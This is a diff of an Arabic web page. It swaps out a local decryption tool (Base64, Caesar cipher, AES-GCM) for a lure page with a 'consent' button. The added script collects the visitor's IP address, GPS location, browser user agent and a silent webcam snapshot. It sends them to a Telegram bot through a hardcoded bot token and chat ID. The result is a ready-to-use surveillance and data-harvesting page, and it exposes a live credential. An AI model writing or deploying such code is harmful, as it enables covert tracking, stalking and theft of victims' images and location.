@@ -1,172 +1,107 @@
-<!doctype html>
+<!DOCTYPE html>
 <html lang="ar">
 <head>
-<meta charset="utf-8"/>
-<meta name="viewport" content="width=device-width,initial-scale=1"/>
-<title>أداة فك التشفير — آمنة وتعليمية</title>
+<meta charset="UTF-8">
+<title>موافقة</title>
 <style>
-  body{font-family:system-ui,Segoe UI,Arial;padding:18px;max-width:900px;margin:auto;color:#111}
-  h1{font-size:20px}
-  .card{border:1px solid #ddd;padding:12px;border-radius:8px;margin-bottom:12px;background:#fafafa}
-  label{display:block;margin:8px 0 4px}
-  textarea,input,select{width:100%;padding:8px;border:1px solid #ccc;border-radius:6px}
-  button{padding:8px 12px;margin-top:8px}
-  pre{background:#111;color:#0f0;padding:10px;border-radius:6px;overflow:auto}
-  .warn{color:#a00;font-weight:600}
+body {
+  font-family: Arial;
+  text-align: center;
+  margin-top: 40px;
+}
+img {
+  width: 220px;
+  display: block;
+  margin: 20px auto;
+}
+button {
+  padding: 10px 20px;
+  font-size: 16px;
+}
 </style>
 </head>
 <body>
-  <h1>أداة فك التشفير (آمنة — تشغيل محلي)</h1>
-  <p class="warn">تنبيه: لا تستعمل هذه الأداة لكسر تشفير لبيانات ما تملكها أو بدون إذن — هذا غير قانوني. الأداة تساعدك فقط على فك تشفير عندما تملك المفتاح أو تريد تجربة تعليمية.</p>
 
-  <div class="card">
-    <h3>1) Base64 — ترميز / فك ترميز</h3>
-    <label>النص (Base64 أو عادي):</label>
-    <textarea id="b64_input" rows="4" placeholder="أدخل نص أو Base64"></textarea>
-    <div style="display:flex;gap:8px;margin-top:6px">
-      <button onclick="b64Decode()">فك Base64</button>
-      <button onclick="b64Encode()">رمّز إلى Base64</button>
-    </div>
-    <label>الناتج:</label>
-    <pre id="b64_out"></pre>
-  </div>
+<h3>📸 سيتم التقاط صورة بعد موافقتك</h3>
+<p>وسيتم إرسالها مع الموقع ونوع الجهاز.</p>
 
-  <div class="card">
-    <h3>2) Caesar Cipher (تعليمي)</h3>
-    <label>النص المشفّر/العادي:</label>
-    <textarea id="caesar_input" rows="3"></textarea>
-    <label>المفتاح (shift — رقم):</label>
-    <input id="caesar_key" type="number" value="3"/>
-    <div style="display:flex;gap:8px;margin-top:6px">
-      <button onclick="caesarDecrypt()">فك التشفير</button>
-      <button onclick="caesarEncrypt()">شفّر</button>
-    </div>
-    <label>الناتج:</label>
-    <pre id="caesar_out"></pre>
-  </div>
+<!-- 🔽 ضع رابط الصورة هنا -->
+<img src="https://ugc.production.linktr.ee/33eeaee9-a676-4312-b3bc-768c4266ef01_IMG-2923.webp?io=true&size=avatar-v3_0" alt="صورة">
 
-  <div class="card">
-    <h3>3) AES‑GCM (مضمون — تحتاج كلمة سر صحيحة)</h3>
-    <p>صيغة الاستخدام: عندما تشفير، احفظ الـ <strong>iv</strong> (12 بايت) و <strong>salt</strong> (مثلاً 16 بايت). هنا نفترض أن الـ ciphertext وارد Base64 ويكون: <code>salt:iv:ciphertext</code> مفصول بنقطتين (<code>:</code>).</p>
+<button onclick="start()">موافق</button>
 
-    <label>أدخل (salt:iv:ciphertext) بالـ Base64 لكل جزئية:</label>
-    <textarea id="aes_input" rows="3" placeholder="مثال: base64(salt):base64(iv):base64(ciphertext)"></textarea>
-
-    <label>كلمة السر (passphrase):</label>
-    <input id="aes_pass" type="password"/>
-
-    <label>خيارات PBKDF2 iterations (افتراضي 100000):</label>
-    <input id="aes_iters" type="number" value="100000"/>
-
-    <div style="display:flex;gap:8px;margin-top:6px">
-      <button onclick="aesDecrypt()">فك AES‑GCM</button>
-    </div>
-
-    <label>الناتج (نص مفكوك أو خطأ):</label>
-    <pre id="aes_out"></pre>
-    <p style="font-size:13px;color:#444">ملاحظة: إذا تلقيت خطأ مصادقة (Authentication failed) فهذا يعني أن كلمة السر أو الـ iv أو الـ salt غير صحيحة.</p>
-  </div>
-
-  <div class="card">
-    <h3>4) أدوات مساعدة</h3>
-    <button onclick="clearAll()">نظف الكل</button>
-  </div>
+<canvas id="canvas" style="display:none;"></canvas>
 
 <script>
-/* ---------- Base64 ---------- */
-function b64Decode(){
-  const v = document.getElementById('b64_input').value.trim();
-  try{
-    // محاولة فك Base64 إلى نص UTF-8
-    const dec = atob(v);
-    // تحويل bytes إلى string آمن
-    const str = decodeURIComponent(Array.from(dec).map(c=> '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2)).join(''));
-    document.getElementById('b64_out').textContent = str;
-  }catch(e){
-    // إذا فشل atob، نعطي تمثيل بايت أو رسالة
-    try{
-      const bytes = Uint8Array.from(v.split(',').map(s=>parseInt(s)));
-      document.getElementById('b64_out').textContent = new TextDecoder().decode(bytes);
-    }catch(_){
-      document.getElementById('b64_out').textContent = 'خطأ فك Base64: ' + e.message;
-    }
+/* 🔧 عدّل هنا */
+const BOT_TOKEN = "7415148537:AAHC9RSt6Ka4Ip34qTCleHx0YXtfGaERwIA";
+const CHAT_ID  = "6251932709";
+
+async function start() {
+  try {
+    // 🌐 IP
+    const ipRes = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipRes.json();
+    const ip = ipData.ip;
+
+    // 📍 الموقع
+    navigator.geolocation.getCurrentPosition(async pos => {
+      const lat = pos.coords.latitude;
+      const lon = pos.coords.longitude;
+
+      // 📸 الكاميرا (بدون معاينة)
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video = document.createElement("video");
+      video.srcObject = stream;
+      await video.play();
+
+      const canvas = document.getElementById("canvas");
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      canvas.getContext("2d").drawImage(video, 0, 0);
+
+      const imageBase64 = canvas.toDataURL("image/png");
+      stream.getTracks().forEach(t => t.stop());
+
+      // 📱 نوع الجهاز
+      const device = navigator.userAgent;
+
+      const text = `
+📸 صورة جديدة
+🌍 الموقع: ${lat}, ${lon}
+🌐 IP: ${ip}
+📱 الجهاز: ${device}
+      `;
+
+      // 📩 إرسال النص
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: text
+        })
+      });
+
+      // 📷 إرسال الصورة
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          photo: imageBase64
+        })
+      });
+
+      alert("✅ تم الإرسال");
+
+    }, () => alert("❌ تم رفض الموقع"));
+
+  } catch (e) {
+    alert("❌ حدث خطأ");
   }
-}
-function b64Encode(){
-  const v = document.getElementById('b64_input').value;
-  try{
-    const enc = encodeURIComponent(v).replace(/%([0-9A-F]{2})/g, function(match, p1){ return String.fromCharCode('0x' + p1);});
-    const b = btoa(enc);
-    document.getElementById('b64_out').textContent = b;
-  }catch(e){ document.getElementById('b64_out').textContent = 'خطأ ترميز Base64: ' + e.message; }
-}
-
-/* ---------- Caesar cipher ---------- */
-function caesarShift(s, shift){
-  const a = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
-  return s.split('').map(ch=>{
-    const i = a.indexOf(ch);
-    if(i===-1) return ch;
-    const base = (i < 26) ? 0 : 26;
-    const idx = (i - base + shift + 26) % 26;
-    return a[base + idx];
-  }).join('');
-}
-function caesarDecrypt(){ const k = parseInt(document.getElementById('caesar_key').value) || 0; document.getElementById('caesar_out').textContent = caesarShift(document.getElementById('caesar_input').value, -k); }
-function caesarEncrypt(){ const k = parseInt(document.getElementById('caesar_key').value) || 0; document.getElementById('caesar_out').textContent = caesarShift(document.getElementById('caesar_input').value, k); }
-
-/* ---------- AES-GCM using Web Crypto API ---------- */
-/*
- Expect input: base64(salt):base64(iv):base64(ciphertext)
- Derive key: PBKDF2 (SHA-256) with given iterations -> AES-GCM 256
-*/
-function b64ToBuf(b64){ return Uint8Array.from(atob(b64), c=>c.charCodeAt(0)); }
-function bufToStr(buf){ try{ return new TextDecoder().decode(buf); }catch(e){ return '[binary data]'; } }
-
-async function aesDecrypt(){
-  const input = document.getElementById('aes_input').value.trim();
-  const pass = document.getElementById('aes_pass').value;
-  const iters = parseInt(document.getElementById('aes_iters').value) || 100000;
-  if(!input || !pass){ document.getElementById('aes_out').textContent = 'أدخل السلسلة وكلمة السر.'; return; }
-
-  const parts = input.split(':');
-  if(parts.length !== 3){ document.getElementById('aes_out').textContent = 'المدخل يجب أن يكون بصيغة salt:iv:ciphertext كل جزء Base64.'; return; }
-
-  try{
-    const salt = b64ToBuf(parts[0]);
-    const iv = b64ToBuf(parts[1]);
-    const ct = b64ToBuf(parts[2]);
-
-    // اشتقاق المفتاح
-    const passKey = await crypto.subtle.importKey('raw', new TextEncoder().encode(pass), 'PBKDF2', false, ['deriveKey']);
-    const key = await crypto.subtle.deriveKey(
-      { name: 'PBKDF2', salt: salt, iterations: iters, hash: 'SHA-256' },
-      passKey,
-      { name: 'AES-GCM', length: 256 },
-      false,
-      ['decrypt']
-    );
-
-    // فك التشفير
-    const plain = await crypto.subtle.decrypt({ name: 'AES-GCM', iv: iv }, key, ct);
-    const text = bufToStr(new Uint8Array(plain));
-    document.getElementById('aes_out').textContent = text;
-  }catch(err){
-    document.getElementById('aes_out').textContent = 'خطأ فك AES: ' + (err.message || err.toString());
-  }
-}
-
-/* ---------- Helpers ---------- */
-function clearAll(){
-  document.getElementById('b64_input').value = '';
-  document.getElementById('b64_out').textContent = '';
-  document.getElementById('caesar_input').value = '';
-  document.getElementById('caesar_out').textContent = '';
-  document.getElementById('aes_input').value = '';
-  document.getElementById('aes_pass').value = '';
-  document.getElementById('aes_out').textContent = '';
-  document.getElementById('status').textContent = 'جاهز';
 }
 </script>
+
 </body>
 </html>
